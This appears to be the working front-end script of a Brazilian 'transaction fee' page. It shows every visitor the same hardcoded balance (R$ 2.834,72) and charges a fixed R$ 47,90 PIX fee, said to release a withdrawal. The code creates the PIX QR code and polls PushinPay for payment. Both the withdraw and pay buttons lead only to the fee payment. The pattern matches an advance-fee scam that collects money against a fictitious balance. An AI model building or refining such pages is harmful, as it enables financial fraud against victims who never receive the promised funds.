// JavaScript para página de Taxa Transacional

// Configuração Supabase
const SUPABASE_URL = window.SUPABASE_CONFIG?.URL || '';
const SUPABASE_ANON_KEY = window.SUPABASE_CONFIG?.ANON_KEY || '';

if (!SUPABASE_URL || !SUPABASE_ANON_KEY) {
}

if (typeof window.taxaTransacionalSupabase === 'undefined') {
    window.taxaTransacionalSupabase = null;
}

const BALANCE = 2834.72;
const TRANSACTION_FEE = 47.90; // Taxa transacional

// Formatar valor como moeda
function formatCurrency(value) {
    return value.toLocaleString('pt-BR', {
        style: 'currency',
        currency: 'BRL'
    }).replace('R$', 'R$ ');
}

// Obter parâmetros da URL
function getUrlParams() {
    const params = new URLSearchParams(window.location.search);
    return {
        name: params.get('name') || 'Cliente',
        pixKey: params.get('pixKey') || '',
        pixKeyType: params.get('pixKeyType') || 'E-mail',
        amount: parseFloat(params.get('amount')) || BALANCE
    };
}

// Criar pagamento PIX via Supabase
async function createPixPayment(amount, payerName, pixKey, pixKeyType, supabaseClient = null) {
    try {
        const client = supabaseClient || window.taxaTransacionalSupabase;
        if (!client) {
            throw new Error('Supabase não inicializado');
        }


        const { data, error } = await client.functions.invoke('bright-api', {
            body: {
                amount: amount,
                description: 'Taxa transacional para liberação do saque',
                payerName: payerName,
                pixKey: pixKey,
                pixKeyType: pixKeyType
            }
        });

        if (error) {
            throw new Error(error.message || 'Erro ao criar pagamento');
        }

        if (!data || !data.success) {
            throw new Error(data?.error || 'Erro ao gerar QR Code PIX');
        }

        return data;
    } catch (error) {
        throw error;
    }
}

// Consultar status do PIX na PushinPay
async function checkPixStatus(paymentId, supabaseClient = null) {
    try {
        const client = supabaseClient || window.taxaTransacionalSupabase;
        if (!client) {
            return null;
        }


        const { data, error } = await client.functions.invoke('bright-api', {
            body: {
                action: 'check_status',
                paymentId: paymentId
            }
        });

        if (error) {
            return null;
        }

        if (data) {
        } else {
        }

        return data;
    } catch (error) {
        return null;
    }
}

// Monitorar confirmação de pagamento
function monitorPaymentConfirmation(paymentId, onConfirmed, supabaseClient = null) {
    const client = supabaseClient || window.taxaTransacionalSupabase;
    if (!client) {
        return;
    }


    let isConfirmed = false;

    // Realtime subscription
    const channel = client.channel(`payment-${paymentId}`)
        .on('postgres_changes', {
            event: 'UPDATE',
            schema: 'public',
            table: 'payment_confirmations',
            filter: `payment_id=eq.${paymentId}`
        }, (payload) => {
            const confirmation = payload.new;
            // IMPORTANTE: Só confirmar se o status for 'confirmed' ou 'paid'
            if (confirmation.payment_id === paymentId &&
                (confirmation.status === 'confirmed' || confirmation.status === 'paid') &&
                !isConfirmed) {
                isConfirmed = true;
                clearInterval(dbPollInterval);
                clearInterval(pushinpayPollInterval);
                client.removeChannel(channel);
                onConfirmed(confirmation);
            } else {
            }
        })
        .subscribe(() => {
        });

    // Polling no banco de dados
    const dbPollInterval = setInterval(async () => {
        if (isConfirmed) {
            clearInterval(dbPollInterval);
            return;
        }

        try {
            const { data, error } = await client
                .from('payment_confirmations')
                .select('*')
                .eq('payment_id', paymentId)
                .maybeSingle();

            if (data && !error && !isConfirmed) {
                // IMPORTANTE: Só confirmar se o status for 'confirmed' ou 'paid'
                if (data.status === 'confirmed' || data.status === 'paid') {
                    isConfirmed = true;
                    clearInterval(dbPollInterval);
                    clearInterval(pushinpayPollInterval);
                    client.removeChannel(channel);
                    onConfirmed(data);
                } else {
                }
            }
        } catch (error) {
        }
    }, 2000);

    // Verificação imediata
    (async () => {
        try {
            const statusData = await checkPixStatus(paymentId, client);
            if (statusData && statusData.status === 'paid' && !isConfirmed) {
                isConfirmed = true;
                clearInterval(dbPollInterval);
                clearInterval(pushinpayPollInterval);
                client.removeChannel(channel);

                const confirmation = {
                    payment_id: paymentId,
                    status: 'confirmed',
                    amount: statusData.value ? parseFloat(statusData.value) / 100 : null,
                    gateway: 'pushinpay'
                };

                onConfirmed(confirmation);
            }
        } catch (error) {
        }
    })();

    // Polling direto na API PushinPay (a cada 5 segundos)
    const pushinpayPollInterval = setInterval(async () => {
        if (isConfirmed) {
            clearInterval(pushinpayPollInterval);
            return;
        }

        try {
            const statusData = await checkPixStatus(paymentId, client);

            if (statusData && statusData.status === 'paid') {
                isConfirmed = true;
                clearInterval(dbPollInterval);
                clearInterval(pushinpayPollInterval);
                client.removeChannel(channel);

                const confirmation = {
                    payment_id: paymentId,
                    status: 'confirmed',
                    amount: statusData.value ? parseFloat(statusData.value) / 100 : null,
                    gateway: 'pushinpay'
                };

                onConfirmed(confirmation);
            }
        } catch (error) {
        }
    }, 5000);

    return () => {
        clearInterval(dbPollInterval);
        clearInterval(pushinpayPollInterval);
        client.removeChannel(channel);
    };
}

// Variável para armazenar o código PIX atual
let currentPixCode = '';

// Mostrar estado de loading no modal
function showPixLoading() {
    const modal = document.getElementById('pixModal');
    const loadingState = document.getElementById('pixLoadingState');
    const errorState = document.getElementById('pixErrorState');
    const successState = document.getElementById('pixSuccessState');
    const confirmedState = document.getElementById('pixConfirmedState');

    if (!modal) return;

    if (errorState) errorState.classList.add('hidden');
    if (successState) successState.classList.add('hidden');
    if (confirmedState) confirmedState.classList.add('hidden');

    if (loadingState) loadingState.classList.remove('hidden');
    modal.classList.remove('hidden');
}

// Mostrar estado de erro no modal
function showPixError(errorMessage) {
    const modal = document.getElementById('pixModal');
    const loadingState = document.getElementById('pixLoadingState');
    const errorState = document.getElementById('pixErrorState');
    const successState = document.getElementById('pixSuccessState');
    const confirmedState = document.getElementById('pixConfirmedState');
    const errorMsgEl = document.getElementById('errorMessage');

    if (!modal) return;

    if (loadingState) loadingState.classList.add('hidden');
    if (successState) successState.classList.add('hidden');
    if (confirmedState) confirmedState.classList.add('hidden');

    if (errorState) errorState.classList.remove('hidden');
    if (errorMsgEl) errorMsgEl.textContent = errorMessage || 'Ocorreu um erro ao gerar o QR Code PIX.';
}

// Mostrar modal com QR Code PIX (estado de sucesso)
function showPixModal(paymentData, amount) {
    const modal = document.getElementById('pixModal');
    const qrCodeImage = document.getElementById('qrCodeImage');
    const pixCode = document.getElementById('pixCode');
    const modalAmount = document.getElementById('modalAmount');
    const loadingState = document.getElementById('pixLoadingState');
    const errorState = document.getElementById('pixErrorState');
    const successState = document.getElementById('pixSuccessState');
    const confirmedState = document.getElementById('pixConfirmedState');

    if (!modal || !qrCodeImage || !pixCode) {
        return;
    }

    if (loadingState) loadingState.classList.add('hidden');
    if (errorState) errorState.classList.add('hidden');
    if (confirmedState) confirmedState.classList.add('hidden');

    if (successState) successState.classList.remove('hidden');

    if (paymentData.qrCode) {
        qrCodeImage.src = paymentData.qrCode;
    }
    if (paymentData.copyPaste) {
        currentPixCode = paymentData.copyPaste;
        pixCode.textContent = currentPixCode;
    }
    if (modalAmount) {
        modalAmount.textContent = formatCurrency(amount);
    }
}

// Mostrar estado de Pagamento Confirmado
function showPixConfirmed(onSuccessCallback) {
    const modal = document.getElementById('pixModal');
    const loadingState = document.getElementById('pixLoadingState');
    const errorState = document.getElementById('pixErrorState');
    const successState = document.getElementById('pixSuccessState');
    const confirmedState = document.getElementById('pixConfirmedState');
    const confirmedTitle = document.getElementById('confirmedTitle');
    const confirmedSubtitle = document.getElementById('confirmedSubtitle');
    const confirmedSpinner = document.getElementById('confirmedSpinner');

    if (!modal || !confirmedState) {
        return;
    }


    if (loadingState) loadingState.classList.add('hidden');
    if (errorState) errorState.classList.add('hidden');
    if (successState) successState.classList.add('hidden');

    confirmedState.classList.remove('hidden');

    if (confirmedTitle) {
        confirmedTitle.style.opacity = '0';
        confirmedTitle.style.transform = 'translateY(10px)';
    }
    if (confirmedSubtitle) {
        confirmedSubtitle.style.opacity = '0';
    }
    if (confirmedSpinner) {
        confirmedSpinner.style.opacity = '0';
    }

    setTimeout(() => {
        if (confirmedTitle) {
            confirmedTitle.style.transition = 'opacity 0.5s ease-out, transform 0.5s ease-out';
            confirmedTitle.style.opacity = '1';
            confirmedTitle.style.transform = 'translateY(0)';
        }
    }, 300);

    setTimeout(() => {
        if (confirmedSubtitle) {
            confirmedSubtitle.style.transition = 'opacity 0.5s ease-out';
            confirmedSubtitle.style.opacity = '1';
        }
    }, 500);

    setTimeout(() => {
        if (confirmedSpinner) {
            confirmedSpinner.style.transition = 'opacity 0.5s ease-out';
            confirmedSpinner.style.opacity = '1';
        }
    }, 700);

    setTimeout(() => {
        if (onSuccessCallback) {
            onSuccessCallback();
        }
    }, 1500);
}

// Inicializar eventos do modal
function initPixModalEvents() {
    const modal = document.getElementById('pixModal');
    const closeModalBtn = document.getElementById('closeModalBtn');
    const copyPixBtn = document.getElementById('copyPixBtn');

    if (!modal) return;

    if (closeModalBtn) {
        closeModalBtn.onclick = () => {
            modal.classList.add('hidden');
        };
    }

    modal.onclick = (e) => {
        if (e.target === modal) {
            modal.classList.add('hidden');
        }
    };

    if (copyPixBtn) {
        copyPixBtn.onclick = async () => {
            if (!currentPixCode) return;

            try {
                await navigator.clipboard.writeText(currentPixCode);

                const originalHTML = copyPixBtn.innerHTML;
                copyPixBtn.innerHTML = `
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-check w-4 h-4">
                        <path d="M20 6 9 17l-5-5"></path>
                    </svg>
                `;
                copyPixBtn.classList.add('bg-emerald-500', 'hover:bg-emerald-600');
                copyPixBtn.classList.remove('bg-[#E94560]', 'hover:bg-[#d63d56]');

                setTimeout(() => {
                    copyPixBtn.innerHTML = originalHTML;
                    copyPixBtn.classList.remove('bg-emerald-500', 'hover:bg-emerald-600');
                    copyPixBtn.classList.add('bg-[#E94560]', 'hover:bg-[#d63d56]');
                }, 2000);
            } catch (error) {
                alert('Erro ao copiar código. Tente selecionar e copiar manualmente.');
            }
        };
    }
}

// Inicializar Supabase
function initSupabase() {
    if (window.supabase && !window.taxaTransacionalSupabase) {
        try {
            window.taxaTransacionalSupabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
                auth: {
                    storage: localStorage,
                    persistSession: true,
                    autoRefreshToken: true
                }
            });
        } catch (error) {
        }
    }
    return window.taxaTransacionalSupabase;
}

// Inicializar ao carregar
window.addEventListener('load', () => {
    initSupabase();
    if (!supabase && window.supabase) {
        initSupabase();
    }

    initPixModalEvents();

    const params = getUrlParams();

    // Atualizar valores
    const balanceDisplays = document.querySelectorAll('.balance-display');
    balanceDisplays.forEach(el => {
        el.textContent = formatCurrency(BALANCE);
    });

    const feeDisplays = document.querySelectorAll('.transaction-fee-display');
    feeDisplays.forEach(el => {
        el.textContent = formatCurrency(TRANSACTION_FEE);
    });

    const userNameEl = document.querySelector('.user-name');
    const pixKeyTypeEl = document.querySelector('.pix-key-type');
    if (userNameEl) userNameEl.textContent = params.name || 'Não informado';
    if (pixKeyTypeEl) pixKeyTypeEl.textContent = params.pixKeyType || 'Não informado';

    // Função para processar pagamento PIX
    async function processPixPayment() {
        try {
            showPixLoading();

            const supabaseClient = initSupabase();
            if (!supabaseClient) {
                throw new Error('Supabase não inicializado');
            }

            const paymentData = await createPixPayment(TRANSACTION_FEE, params.name, params.pixKey, params.pixKeyType, supabaseClient);

            if (paymentData && paymentData.paymentId) {
                monitorPaymentConfirmation(paymentData.paymentId, (confirmation) => {
                    showPixConfirmed(() => {
                        const nextUrl = `receber-agora.html?name=${encodeURIComponent(params.name)}&pixKey=${encodeURIComponent(params.pixKey)}&pixKeyType=${encodeURIComponent(params.pixKeyType)}`;
                        window.location.href = nextUrl;
                    });
                }, supabaseClient);

                showPixModal(paymentData, TRANSACTION_FEE);
            } else {
                throw new Error('Resposta inválida da API');
            }
        } catch (error) {
            showPixError(error.message || 'Erro ao processar pagamento. Tente novamente.');
        }
    }

    // Botão pagar taxa transacional
    const payTransactionFeeBtn = document.getElementById('payTransactionFeeBtn');
    if (payTransactionFeeBtn) {
        payTransactionFeeBtn.addEventListener('click', processPixPayment);
    }

    // Botão sacar (abre modal também)
    const withdrawBtn = document.getElementById('withdrawBtn');
    if (withdrawBtn) {
        withdrawBtn.addEventListener('click', processPixPayment);
    }

    // Botão tentar novamente (retry)
    const retryPixBtn = document.getElementById('retryPixBtn');
    if (retryPixBtn) {
        retryPixBtn.addEventListener('click', processPixPayment);
    }
});

